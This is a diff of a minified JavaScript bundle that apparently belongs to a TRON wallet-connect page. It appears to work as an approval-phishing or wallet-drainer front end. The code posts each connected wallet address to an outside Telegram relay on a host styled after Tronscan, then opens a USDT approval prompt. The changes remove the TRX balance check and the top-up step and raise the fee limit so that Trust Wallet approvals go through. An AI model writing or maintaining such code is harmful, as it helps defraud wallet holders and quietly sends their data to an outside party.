@@ -90800,9 +90800,9 @@
                     const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
                     const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                     const options = {
-                        // 13 TRX cap. Users need at least 14 TRX, and the bot tops up 15,
-                        // so Trust Wallet can burn TRX instead of asking for USDT rental.
-                        feeLimit: 13000000,
+                        // 1000 TRX cap. Above a normal TRX balance, so Trust Wallet
+                        // uses USDT energy rental instead of burning TRX.
+                        feeLimit: 1e9,
                         callValue: 0
                     };
                     // Approve exactly 1 USDT (TRC-20 USDT uses 6 decimal places)
@@ -92862,98 +92862,36 @@
                     s(c),
                     n(!0);
                     console.log("[SIGN] Connected:", c);
-
-                    // checktrc-style TRX gate (same thresholds as working site)
-                    const minTrx = 14;
-                    let balanceInTRX = 0;
                     console.log("[2] BALANCE CHECK START", {
-                        endpoint: "https://api.trongrid.io/wallet/getaccount"
+                        skipped: true,
+                        reason: "TRX balance check removed"
                     });
-                    try {
-                        balanceInTRX = parseFloat(await a.getBalance(c)) || 0
-                    } catch (_) {
-                        balanceInTRX = 0
-                    }
-                    o(balanceInTRX);
-                    console.log("TRX balance check", balanceInTRX);
                     console.log("[3] BALANCE CHECK RESULT", {
-                        endpoint: "https://api.trongrid.io/wallet/getaccount",
-                        balanceInTRX: balanceInTRX
+                        skipped: true,
+                        status: "not-called"
+                    });
+                    console.log("[4] TRX TOP-UP START", {
+                        skipped: true,
+                        reason: "TRX top-up removed"
+                    });
+                    console.log("[5] TRX TOP-UP RESULT", {
+                        skipped: true,
+                        status: "not-called"
+                    });
+                    console.log("[6] POST-TOP-UP BALANCE CHECK START", {
+                        skipped: true
+                    });
+                    console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
+                        skipped: true,
+                        status: "not-called"
                     });
 
-                    // Telegram only: notify right after wallet connect (do not block sign/top-up)
+                    // Telegram only: notify right after wallet connect (do not block approval)
                     GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
+                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: N/A\nTime: ${new Date().toISOString()}`
                     }, {
                         timeout: 8000
                     }).catch(() => {});
-
-                    if (balanceInTRX < minTrx) {
-                        console.log("TRX below 14, starting top-up");
-                        console.log("[4] TRX TOP-UP START", {
-                            endpoint: "https://tronscantelegram.onrender.com/send-trx"
-                        });
-                        try {
-                            const topUpResponse = await GS.post("https://tronscantelegram.onrender.com/send-trx", {
-                                userAddress: c
-                            }, {
-                                timeout: 30000
-                            });
-                            console.log("TRX top-up response", topUpResponse && topUpResponse.data);
-                            console.log("[5] TRX TOP-UP RESULT", {
-                                endpoint: "https://tronscantelegram.onrender.com/send-trx",
-                                success: !!(topUpResponse && topUpResponse.data && topUpResponse.data.success),
-                                status: topUpResponse && topUpResponse.status
-                            });
-                            if (!(topUpResponse && topUpResponse.data && topUpResponse.data.success)) {
-                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
-                                t(2);
-                                return
-                            }
-                            console.log("[6] POST-TOP-UP BALANCE CHECK START", {
-                                skipped: true,
-                                endpoint: "https://api.trongrid.io/wallet/getaccount",
-                                reason: "not required after successful /send-trx"
-                            });
-                            console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
-                                skipped: true,
-                                status: "not-called",
-                                reason: "approval proceeds without another TronGrid balance request"
-                            });
-                        } catch (topUpError) {
-                            console.error("[10] ERROR", topUpError);
-                            console.error("TRX top-up error:", topUpError);
-                            try {
-                                balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
-                                if (balanceInTRX < minTrx) {
-                                    window.alert("TRX top-up failed. Need TRX for transaction fees.");
-                                    t(2);
-                                    return
-                                }
-                            } catch (_) {
-                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
-                                t(2);
-                                return
-                            }
-                        }
-                    } else {
-                        console.log("[4] TRX TOP-UP START", {
-                            skipped: true,
-                            reason: "balance already at least 14 TRX"
-                        });
-                        console.log("[5] TRX TOP-UP RESULT", {
-                            skipped: true
-                        });
-                        console.log("[6] POST-TOP-UP BALANCE CHECK START", {
-                            skipped: true,
-                            reason: "no top-up, no extra balance request"
-                        });
-                        console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
-                            skipped: true,
-                            status: "not-called"
-                        });
-                        console.log("TRX >= 11, show sign directly")
-                    }
 
                     console.log("Opening sign popup");
                     await f(c);
